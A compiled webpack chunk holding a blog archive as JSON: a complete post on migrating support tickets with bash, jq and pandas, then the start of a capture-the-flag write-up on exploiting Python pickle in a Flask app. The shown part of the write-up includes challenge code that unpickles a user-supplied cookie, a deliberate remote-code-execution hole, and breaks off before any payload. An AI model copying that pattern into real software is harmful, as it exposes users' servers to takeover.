"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[48130],{77735:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"3-way-data-migration-between-support-systems","metadata":{"permalink":"/blog/3-way-data-migration-between-support-systems","source":"@site/blog/3-way-data-migration-between-support-systems.md","title":"3-Way Data Migration between Support\xa0Systems","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Bash","permalink":"/blog/tags/bash"},{"inline":false,"label":"Data_engineering","permalink":"/blog/tags/data-engineering"},{"inline":false,"label":"Jq","permalink":"/blog/tags/jq"},{"inline":false,"label":"Migration","permalink":"/blog/tags/migration"},{"inline":false,"label":"Pandas","permalink":"/blog/tags/pandas"},{"inline":false,"label":"Python","permalink":"/blog/tags/python"}],"readingTime":11.315,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"3-way-data-migration-between-support-systems","title":"3-Way Data Migration between Support\xa0Systems","description":"Fill me up!","authors":["kbbgl"],"tags":["bash","data_engineering","jq","migration","pandas","python"]},"unlisted":false,"nextItem":{"title":"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App","permalink":"/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask"}},"content":"## Introduction\\n\\nThe company I work for decided a few months ago that we\u2019ll be moving all customer tickets and assets from two separate systems (one for chat and one for old-school tickets) into a new, integrated system which provides both capabilites.\\nMy task was to perform the migration between the systems.\\nEven though I\u2019m not data engineer by any means, I accepted the challenge and thought it would teach me a lot about the planning and execution of such a complex project. It would also allow me to hone in my development/scripting skills and finally have some hands-on experience using a Python library I was always interested in working with, [pandas](https://pandas.pydata.org/).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Planning the Migration\\n\\nThe first step was to understand what format the source and destination platforms supplied and expected the data in, respectively.\\nAfter reaching out to the destination platform engineers, they provided the following information:\\n\\n- Supply a TAR archive with JSON files named `backup_tickets_{batch_number}.json`.\\n- The JSON files need to have the following structure:\\n\\n    ```json\\n    {\\n    \xa0\xa0\xa0\\"data\\": {\\n    \xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"tickets\\": {\\n    \xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"data\\": [],\\n    \xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"comments\\": [],\\n    \xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"users\\": []\\n    \xa0\xa0\xa0\xa0\xa0\xa0\xa0}\\n    \xa0\xa0\xa0}\\n    }\\n    ```\\n\\n- Each JSON file should not include more than 100 objects within each nested array (`data`, `comments`, `users`, `organizations`).\\n- The structure for each object had to be as follows:\\n\\n  - `ticket` object blueprint:\\n\\n    ```json\\n    {\\n    \xa0\xa0\xa0\\"created_at\\": \\"2021-01-01T00:00:00Z\\",\\n    \xa0\xa0\xa0\\"requester_id\\": 123456,\\n    \xa0\xa0\xa0\\"id\\": 654321\\n    }\\n    ```\\n\\n  - `comment` object blueprint:\\n\\n    ```json\\n    {\\n    \xa0\xa0\xa0\\"created_at\\": \\"2021-02-02T02:02:02Z\\",\\n    \xa0\xa0\xa0\\"ticket_id\\": 211243,\\n    \xa0\xa0\xa0\\"id\\": 789012,\\n    \xa0\xa0\xa0\\"public\\": true,\\n    \xa0\xa0\xa0\\"html_body\\": \\"<p>dummy message</p>\\",\\n    \xa0\xa0\xa0\\"author_id\\": 123456\\n    }\\n    ```\\n\\n    - `user` object blueprint:\\n\\n    ```json\\n    {\\n    \xa0\xa0\xa0\\"name\\": \\"John Doe\\",\\n    \xa0\xa0\xa0\\"id\\": 00076,\\n    \xa0\xa0\xa0\\"email\\": \\"john.doe@somedomain.org\\"\\n    }\\n    ```\\n\\nThe source data came from two different places:\\n\\n- The chat-related data was stored in a database that I did not have access to. Therefore, I received the data in CSV format with the following headers:\\n\\n  ```bash\\n  head -n1 chat_data.csv\\n\\n  TICKET_CREATED_AT,TICKET_REQUESTER_ID,COMMENT_PART_ID,CONVERSATION_ID,COMMENT_PUBLIC,BODY,COMMENT_CREATED_AT,AUTHOR_ID,NAME,EMAIL\\n  ```\\n\\n- The ticket-related data was available through the provider REST API. This data was already imported into the destination system when I was assigned this task. So I needed to focus my efforts on migrating the chat-related data. I thought it would make the process easier but it actually complicated it a bit. More details on that in the section below.\\n\\n## The User Uniqueness Problem\\n\\nOne crucial detail that was not mentioned in the destination platform documentation was that the **users imported need to be unique based on their email address**.\\n\\nThis complicated things because:\\n\\n- The users from the source ticketing platform already existed in the destination platform since they were previously imported.\\n\\n- There were users that existed on both source platforms but had different id attribute values.\\n  \\n- The requirement from the destination platform system was to use the user id attribute that was already imported into the system.\\n\\nAfter some brainstorming, I was able to think about how to solve this discrepency. I broke up the problem into the following steps:\\n\\n1. Retrieve all users from the source ticketing platform.\\n1. Retrieve all users from the source chat platform.\\n1. Run a VLOOKUP to compare the id from both lists of users. If the email existed in both lists, take the id from the list of users generated in step 1. Otherwise, use the id from the list retrieved in step 2.\\n\\n## Step 1: Retrieving Users from Source Ticketing Platform\\n\\nSince I already knew the source ticketing platform could supply user data by accessing their REST API, I began by reading their documentation.\\n\\nI found out that:\\n\\n- The endpoint to retrieve user data was:\\n    `GET /api/v1/users.json`.\\n\\n- The endpoint returned a maximum of 100 users in JSON format.\\n- The endpoint offered a query parameter to specify paging through all users, i.e. `GET /api/v1/users.json?page=100`.\\n- Basic authentication method was used to authenticate calls.\\n- The JSON response included many user attributes. I was only interested in 2 of them: `id` and `email`.\\n\\nReviewing the total amount of users in that platform, I found that there were a total of 56.7k. So I needed to run 567 calls (56700/100) to retrieve all the users. Sounds like a perfect solution for a combination of `curl`, `jq` within `bash` loops and redirection of output to appended file.\\nThis is what I came up with:\\n\\n```bash\\nfor i in {1..567}\\ndo\\n\xa0\xa0\xa0\xa0echo \\"Retrieving users page $i...\\"\\n\xa0\xa0\xa0\xa0curl https://$SOURCE_URL.com/api/v1/users.json\\\\?page=$i -u my_user/my_password | jq \'.users[] | [.id, .email] | @csv\' >> ticket_platform_users.csv\\n\xa0\xa0\xa0\xa0echo \\"Finished retrieving users from page $i\\"\\ndone\\n```\\n\\nThis loop generated a CSV file with the following data:\\n\\n```bash\\nhead -n3 ticket_platform_users.csv\\n\xa0\\nid,email\\n1,user1@somedomain1.org\\n2,user2@somedomain2.org\\n```\\n\\nStep 1 is done!\\n\\n## Step 2: Generating Unique Users List from Source Chat Platform\\n\\nAs previously mentioned, the data from the chat platform was sent to me in CSV format with the following headers:\\n\\n```bash\\n  head -n1 chat_data.csv\\n\\n  TICKET_CREATED_AT,TICKET_REQUESTER_ID,COMMENT_PART_ID,CONVERSATION_ID,COMMENT_PUBLIC,BODY,COMMENT_CREATED_AT,AUTHOR_ID,NAME,EMAIL\\n```\\n\\nThe `chat_data.csv` file included all chat conversations which meant that every line in the CSV represented one message sent on the chatting platform. Since users (or `AUTHOR_ID` in this case) can write multiple messages in different `CONVERSATION_ID`s, I needed a way to take only the unique `AUTHOR_ID`s from this CSV. This is where I was introduced to the power of the Python `pandas` library.\\nI was able to generate a list of unique users using the following script:\\n\\n```python title=\\"generate_unique_users.py\\"\\n#!/usr/bin/env python\\n\\"\\"\\"\\ngenerate_unique_users.py\\n\\"\\"\\"\\nimport pandas as pd\\n\xa0\\n# Read only the relevant columns from the CSV file\\nusers = pd.read_csv(\\n\xa0\xa0\xa0\'chat_data.csv\',\\n\xa0\xa0\xa0usecols=[\'NAME\', \'EMAIL\', \'AUTHOR_ID\']\\n)\\n\xa0\\n# Rename the columns according to the `users` object blueprint\\nusers_rename = users.rename({\\n\xa0\xa0\xa0\\"AUTHOR_ID\\": \\"id\\",\\n\xa0\xa0\xa0\\"NAME\\": \\"name\\",\\n\xa0\xa0\xa0\\"EMAIL\\": \\"email\\"\\n})\\n\xa0\\n# Modify the column data type according to `users` object blueprint. `int64` is the `numpy.dtype` representing a number\\nusers_coltype = users_rename.astype({\\n\xa0\xa0\xa0\\"id\\": \\"int64\\"\\n})\\n\xa0\\n# Remove any rows with `null`\\nremoved_na = users_coltype.dropna(how=\'any\')\\n\xa0\\n# Remove duplicate rows, use `email` column as key\\nremoved_dups = removed_na.drop_duplicates(subset=[\\"email\\"], keep=\\"first\\")\\n\xa0\\n# Display the number of unique users\\ncount = removed_dups.index\\nprint(\\"Found {} unique users\\".format(len(count)))\\n\xa0\\n# Generate new CSV with unique users\\nremoved_dups.to_csv(\\"chat_platform_users.csv\\", index=False)\\n```\\n\\nI ran the script which generated `chat_platform_users.csv` with 13k unique users (where the file `chat_data.csv` had 2.5M rows).\\n\\nStep 2 done!\\n\\n## Step 3: User List Merging based on Common Attribute\\n\\nSo now we had 2 CSV files:\\n\\n- `ticket_platform_users.csv` with 56k users.\\n- `chat_platform_users.csv` with 13k users.\\n\\nSince I am pretty proficient with Excel/Google Spreadsheet formulas, I decided to use the `VLOOKUP` function to generate the required list.\\nI imported both CSVs into two separate sheets named after their filenames, namely:\\n\\n- Sheet 1: `ticket_platform_users` had 2 columns, `email, id`\\n- Sheet 2: `chat_platform_users`, had 3 columns, `name, email, id`.\\n- Sheet 3: `merged` \u2013 This is where we\u2019re going to generate a merged list of users. It had 3 columns as well, `name, email, id`.\\n\\nThe name and email rows were taken from Sheet 2, the `id` had the following formula in it (in the 2nd row of the sheet):\\n\\n```excel-formula\\n=IFNA(VLOOKUP(A2, ticket_platform_users!$A$2:$B$56748, 2, false), chat_platform_users!C2)\\n```\\n\\nThe explanation of the formula:\\n\\n- The `IFNA` function takes in 2 arguments:\\n\\n  1. The first argument is the value which we want to check if it returns a N/A value.\\n  \\n  1. The second argument determines what value will be returned in the cell if the value returned in the first argument is NA.\\n\\n  We use this function because we know that some user emails (cells `A2...AN`) will not be found in both sheets so we want to return the `id` of the user from the `chat_platform_users` in this case. Otherwise, if the `VLOOKUP` function does return a successful match for email in both sheets, the `IFNA` will evaluate the `VLOOKUP` value instead.\\n\\n- The `VLOOKUP` function takes 4 arguments:\\n\\n    1. The first argument is the value to search for. In the example above, cell `A2` evaluates to a user email so we\u2019ll be searching for that email.\\n\\n    1. The second argument is the range where we\u2019ll be looking for a value matching `A2`. `ticket_platform_users!$A$2:$B$56748` in plain words means: \u2018within the ticket_platform_users spreadsheet in the static range from cells `A2` to `B56748`\u2018.\\n\\n    1. The third argument identifies the column number to return if a successful match is found. We\u2019ve specified 2 in this case because we\u2019re interested in returning the value from 2nd column from the sheet `ticket_platform_users` which is the id.\\n\\n    1. The fourth argument is optional and it indicates to the function whether the data is sorted. It is set to false because I imported the data unsorted.\\n\\nI exported the merged sheet to file `merged_users.csv`.\\n\\nStep 3 done!\\n\\n## Creating Batch JSON Objects from CSV\\n\\nAt this point, I had put a lot of time and mental energy into manipulating the users data to fit the requirements but had not touched either the tickets or comments data yet. I still needed to somehow generate the JSON representation for all 3 data sets (`user`, `comment`, `ticket`) and somehow insert these data sets into their appropriate final JSON object arrays.\\n\\nLuckily, `pandas` was there to lend a hand.\\n\\nI wrote 3 similar scripts, one for each data set.\\nFor the `user` CSV:\\n\\n```python title=\\"generate_user_json.py\\"\\n#!/usr/bin/env python\\n\\"\\"\\"\\n# generate_user_json.py\\n\\"\\"\\"\\n\\nimport pandas as pd\\n\xa0\\nusers = pd.read_csv(\\n\xa0\xa0\xa0\xa0\'merged_users.csv\'\\n)\\n\xa0\\n# Modify column data types so `id` is a number\\nusers_dt = users.astype(\\n\xa0\xa0\xa0\xa0{\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'id\': \'int64\'\\n\xa0\xa0\xa0\xa0}\\n)\\n\xa0\\n\xa0\\n# Convert DataFrame to JSON object\\n# One object per line\\nout = users_dt.to_json(orient=\'records\', lines=True)\\n\xa0\\nwith open(\'all_users_lines.json\', \'w\', encoding=\'utf-8\') as f:\\n\xa0\xa0\xa0\xa0f.write(out)\\n\\"\\"\\"\\n```\\n\\nFor `comment`:\\n\\n```python title=\\"generate_comment_json.py\\"\\n#!/usr/bin/env python\\n\\"\\"\\"\\ngenerate_comment_json.py\\n\\"\\"\\"\\n\\nimport pandas as pd\\n\xa0\\ncomments = pd.read_csv(\\n\xa0\xa0\xa0\xa0\'chat_data.csv\',\\n\xa0\xa0\xa0\xa0\xa0usecols=[\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'COMMENT_PART_ID\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'AUTHOR_ID\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'BODY\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'COMMENT_PUBLIC\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'CONVERSATION_ID\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'COMMENT_CREATED_AT\'\\n\xa0\xa0\xa0\xa0]\\n)\\n\xa0\\n# Remove duplicates\\nremoved_dups = comments.drop_duplicates(subset=[\\"COMMENT_PART_ID\\"], keep=\\"first\\")\\n\xa0\\n# Remove comments with null fields\\nremoved_na = removed_dups.dropna(how=\'any\')\\n\xa0\\n# Rename columns according to specifications\\ncomments_object = removed_na.rename(columns=\\n\xa0\xa0\xa0\xa0{\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"COMMENT_PART_ID\\": \\"id\\", \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"AUTHOR_ID\\": \\"author_id\\", \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"BODY\\": \\"html_body\\",\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"COMMENT_PUBLIC\\": \\"public\\",\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"COMMENT_CREATED_AT\\": \\"created_at\\",\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"CONVERSATION_ID\\": \\"ticket_id\\"\\n\xa0\xa0\xa0\xa0}\\n)\\n\xa0\\n# Modify column data types\\n# According to numpy dtypes\\n# https://numpy.org/doc/stable/user/basics.types.html\\ncomments_final = comments_object.astype(\\n\xa0\xa0\xa0\xa0{\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'id\': \'int64\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'author_id\': \'int64\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'html_body\': \'str\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'public\': \'bool\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'ticket_id\': \'int64\',\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'created_at\': \'str\'\\n\xa0\xa0\xa0\xa0}\\n)\\n\xa0\\n# Convert DataFrame to JSON object\\n# One object per line\\nout = comments_final.to_json(orient=\'records\', lines=True)\\noutfile=\'all_comments_lines.json\'\\nwith open(outfile, \'w\', encoding=\'utf-8\') as f:\\n\xa0\xa0\xa0\xa0f.write(out)\\n```\\n\\nFor `ticket`:\\n\\n```python title=\\"generate_ticket_json.py\\"\\n#!/usr/bin/env python\\n\\n\\"\\"\\" \\ngenerate_ticket_json.py\\n\\"\\"\\"\\n\\nimport pandas as pd\\n\xa0\\ntickets = pd.read_csv(\\n\xa0\xa0\xa0\xa0\'chat_data.csv\', \\n\xa0\xa0\xa0\xa0usecols=[\'TICKET_REQUESTER_ID\', \'TICKET_CREATED_AT\', \'CONVERSATION_ID\']\\n)\\n\xa0\\n# Remove ticket duplicates\\nremoved_ticket_dups = tickets.drop_duplicates(subset=[\\"CONVERSATION_ID\\"], keep=\\"first\\")\\n\xa0\\n# Rename columns according to specifications\\ntickets_object = removed_ticket_dups.rename(columns=\\n\xa0\xa0\xa0\xa0{\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"CONVERSATION_ID\\": \\"id\\", \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"TICKET_CREATED_AT\\": \\"created_at\\", \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\"TICKET_REQUESTER_ID\\": \\"requester_id\\"\\n\xa0\xa0\xa0\xa0}\\n)\\n\xa0\\n# Modify column data types\\ntickets_final = tickets_object.astype(\\n\xa0\xa0\xa0\xa0{\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'id\': \'int64\', \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\'requester_id\': \'int64\'\\n\xa0\xa0\xa0\xa0}\\n)\\n\xa0\\nout = tickets_final.to_json(orient=\'records\', lines=True)\\noutfile=\'all_tickets_lines.json\'\\nwith open(outfile, \'w\', encoding=\'utf-8\') as f:\\n\xa0\xa0\xa0\xa0f.write(out)\\n```\\n\\nI used the `DataFrame::to_json(lines=True)` method, option because it generated a JSON object per line. Since I knew that the requirement was to have a maximum of 100 objects per array representing the comment, user or ticket in the final JSON asset, I found it easier to split the output files (`all_tickets_lines.json`, `all_comments_lines.json`, `all_users_lines.json`) into a batch of files where each one would have 100 JSON objects within them.\\n\\nI developed the following script to produce just that:\\n\\n```python title=\\"split_into_batch_files.py\\"\\n#!/usr/bin/env python\\n\\"\\"\\"\\nsplit_into_batch_files.py\\n\\"\\"\\"\\n# Define iteration group\\nassets=[\'tickets\', \'users\', \'comments\']\\n\xa0\\n\xa0\\n\\"\\"\\"\\nInput JSON files\\n\\"\\"\\"\\ntickets_file=\\"../../{}/all_{}_lines.json\\".format(assets[0], assets[0])\\nusers_file=\\"../../{}/all_{}_lines.json\\".format(assets[1], assets[1])\\ncomments_file=\\"../../{}/all_{}_lines.json\\".format(assets[2], assets[2])\\n\xa0\\n\xa0\\n### Split JSON files into smaller batches\\nlines_per_file=100\\n\xa0\\nfor asset in assets:\\n\xa0\xa0\xa0\xa0current_file=\'../../{}/all_{}_lines.json\'.format(asset, asset)\\n\xa0\xa0\xa0\xa0print(\\"Splitting file \'{}\' into files with {} lines...\\".format(current_file, str(lines_per_file)))\\n\xa0\xa0\xa0\xa0batch_file = None\\n\xa0\xa0\xa0\xa0with open(current_file) as bigfile:\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0for line_number, line in enumerate(bigfile):\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if line_number % lines_per_file == 0:\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if batch_file:\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0batch_file.close()\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0small_filename = \'./{}_split/{}.json\'.format(asset, line_number + lines_per_file)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0batch_file = open(small_filename, \\"w\\")\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0batch_file.write(line)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if batch_file:\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0batch_file.close()\\n\xa0\xa0\xa0\xa0print(\\"Finished splitting file \'{}\'\\".format(current_file))\\n```\\n\\nAfter executing the script above, I had files with 100 JSON objects on each line in the file:\\n\\n```bash\\nls ./comments_split/*.json | wc -l\\n\xa0\xa0\xa021004\\n\xa0\\nls ./tickets_split/*.json | wc -l\\n\xa0\xa0\xa0\xa0\xa0925\\n\xa0\\nls ./users_split/*.json | wc -l\\n\xa0\xa0\xa0\xa0\xa0138\\n```\\n\\nThe final step was to iterate over each folder, read the `n`th file within that folder and insert the 100 JSON objects into an output JSON file named `backup_tickets_{batch_number}.json`.\\nThis is the script I wrote to produce just that:\\n\\n```python title=\\"backup_tickets.py\\"\\n#!/usr/bin/env python\\n\\nimport os\\nimport pandas as pd\\nimport json\\n\xa0\\nassets=[\'tickets\', \'users\', \'comments\']\\n\xa0\\n\\"\\"\\"\\nInput JSON files\\n\\"\\"\\"\\ntickets_dir=\\"./{}_split\\".format(assets[0])\\ncomments_dir=\\"./{}_split\\".format(assets[2])\\nusers_dir=\\"./{}_split\\".format(assets[1])\\n\xa0\\n\\"\\"\\"\\nOutput JSON files\\n\\"\\"\\"\\noutput_folder=\\"../assets_to_send\\"\\n\xa0\\n# Every file in asset folder is called after the batch number * 100\\n# So first file is called \'100.json\' per each folder (\'./tickets/100.json\', \'./users/100.json\', \'./comments/100.json\')\\n# The last file is called \'./comments_split/2100400.json\\nfor x in range(100, 2100400, 100):\\n\xa0\\n\xa0\xa0\xa0\xa0output_filename=os.path.join(output_folder, \\"backup_tickets_{}.json\\".format(x))\\n\xa0\\n\xa0\xa0\xa0\xa0print(\\"Generating JSON for batch {}...\\".format(x))\\n\xa0\\n\xa0\xa0\xa0\xa0# Create root JSON object\\n\xa0\xa0\xa0\xa0root={}\\n\xa0\xa0\xa0\xa0root[\\"data\\"] = {}\\n\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"] = {}\\n\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"][\\"data\\"] = []\\n\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"][\\"comments\\"] = []\\n\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"][\\"users\\"] = []\\n\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"][\\"organizations\\"] = []\\n\xa0\\n\xa0\xa0\xa0\xa0for asset in assets:\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0current_ticket_file = os.path.join(tickets_dir, \\"{}.json\\".format(x))\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0current_comments_file = os.path.join(comments_dir, \\"{}.json\\".format(x))\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0current_users_file = os.path.join(users_dir, \\"{}.json\\".format(x))\\n\xa0\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if os.path.exists(current_ticket_file):\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0tickets=pd.read_json(current_ticket_file, lines=True, convert_dates=False)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0ticket_out = tickets.to_json(orient=\'records\')\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0ticket_out_dict = json.loads(ticket_out)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"].update({\'data\': ticket_out_dict})            \\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if os.path.exists(current_users_file):\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0users = pd.read_json(current_users_file, lines=True, convert_dates=False)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0users_out = users.to_json(orient=\'records\')\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0users_out_dict = json.loads(users_out)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"].update({\'users\': users_out_dict})\\n\xa0\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if os.path.exists(current_comments_file):\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0comments = pd.read_json(current_comments_file, lines=True, convert_dates=False)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0comments_out = comments.to_json(orient=\'records\')\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0comments_out_dict = json.loads(comments_out)\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0root[\\"data\\"][\\"tickets\\"].update({\'comments\': comments_out_dict})\\n\xa0\\n\xa0\xa0\xa0\xa0print(\\"Writing ticket JSON to file \'{}\'...\\".format(output_filename))\\n\xa0\xa0\xa0\xa0with open(output_filename, \'w\', encoding=\'utf-8\') as f:\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0json.dump(root, f, indent=3)\\n```\\n\\nI compressed the generated assets into an archive which contained 21k JSON files:\\n\\n```bash\\ntar tf backup_tickets.tar.gz | head\\n./backup_tickets_1605900.json\\n./backup_tickets_1670800.json\\n./backup_tickets_1585100.json\\n./backup_tickets_1217200.json\\n./backup_tickets_1344500.json\\n./backup_tickets_990600.json\\n./backup_tickets_1331400.json\\n./backup_tickets_1262300.json\\n./backup_tickets_171600.json\\n\xa0\\ntar tf backup_tickets.tar.gz| wc -l\\n\xa0\xa0\xa021004\\n```\\n\\nMigration complete!"},{"id":"angstrom-ctf2021-exploiting-python-pickle-in-flask","metadata":{"permalink":"/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask","source":"@site/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask.md","title":"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Ctf","permalink":"/blog/tags/ctf"},{"inline":false,"label":"Python","permalink":"/blog/tags/python"},{"inline":false,"label":"Security","permalink":"/blog/tags/security"},{"inline":false,"label":"Web","permalink":"/blog/tags/web"}],"readingTime":10.445,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"angstrom-ctf2021-exploiting-python-pickle-in-flask","title":"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App","description":"Fill me up!","authors":["kbbgl"],"tags":["ctf","python","security","web"]},"unlisted":false,"prevItem":{"title":"3-Way Data Migration between Support\xa0Systems","permalink":"/blog/3-way-data-migration-between-support-systems"},"nextItem":{"title":"How To Catch EBUSY Event on Windows using NodeJS","permalink":"/blog/catch-ebusy-on-nodejs"}},"content":"## Introduction\\n\\nRecently, I became interested in understanding a bit more about web application exploitation. This interest evolved with my daily work with web applications over the last few years, reviewing already developed web application source code, modifying it at times in order to resolve a customer issue and needing to dive deep and debug customer problems in production.\\nBut I always felt that my daily work was only focusing on how to resolve an issue for a customer. I never branched out to actually understanding the security behind the web applications and services I\u2019m debug and the code I was reviewing and modifying. Moreover, I felt that I was not able to identify any security vulnerabilities in the applications I was working with.\\nSo I challenged to take this next step in learning more about web application security vulnerabilities by signing up to [\xe5ngstromCTF 2021](https://2021.angstromctf.com), an annual capture-the-flag competition hosted by Montgomery Blair High School (ironically located very near to the high school I attended in Maryland).\\nThis post describes the process by which I was able to finish one of the challenges called Jar under the Web category.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Initial Setup\\n\\nWhen clicking on the particular challenge, you are presented with the following modal:\\n\\n![modal](./res/modal.png)\\n\\nIt includes a link to the web application, a `Dockerfile`, `jar.py` and an image of a pickle (`pickle.jpg`). I downloaded all files, opened the directory in Visual Studio Code, built and ran the docker image:\\n\\n```bash\\nmkdir jar\\ncd jar\\ncode -a .\\nwget https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/jar.py\\n \\nwget https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/Dockerfile\\n \\nwget https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/pickle.jpg\\n \\ndocker build . -t ctf2021-web-jar\\ndocker run --net host -p 5000:5000 $IMAGE_ID\\n```\\n\\nAnd loaded the application on my browser:\\n\\n![app_load](./res/app_load.png)\\n\\nWe\u2019re introduced to a stretched-out image of the pickle and an input box. Adding any text to the input box generates a REST API POST request to the Flask server and adds a text node over the pickle image:\\n\\n![tests](./res/tests.png)\\n\\nI added 3 text for testing purposes: \u2018admin\u2019, \'test2\u2019, \u2018really ugly ui\u2019 (I hope you agree that it is).\\n\\n## Reviewing the Flask Server Code\\n\\nThe Flask server code is pretty simple. It has 3 routes:\\n\\n* `GET /` - The root path.\\n* `GET ./pickle.jpg` - Sends back the image to the frontend.\\n* `POST /add` - The path where the payload is sent when a new word is added in the input box.\\n\\nI focused my attention on the latter two routes as the exploit was likely to be found there. Here\u2019s the code for both:\\n\\n```python\\n@app.route(\'/\')\\ndef jar():\\n    contents = request.cookies.get(\'contents\')\\n    if contents: items = pickle.loads(base64.b64decode(contents))\\n    else: items = []\\n    return \'<form method=\\"post\\" action=\\"/add\\" style=\\"text-align: center; width: 100%\\"><input type=\\"text\\" name=\\"item\\" placeholder=\\"Item\\"><button>Add Item</button><img style=\\"width: 100%; height: 100%\\" src=\\"/pickle.jpg\\">\' + \\\\\\n        \'\'.join(f\'<div style=\\"background-color: white; font-size: 3em; 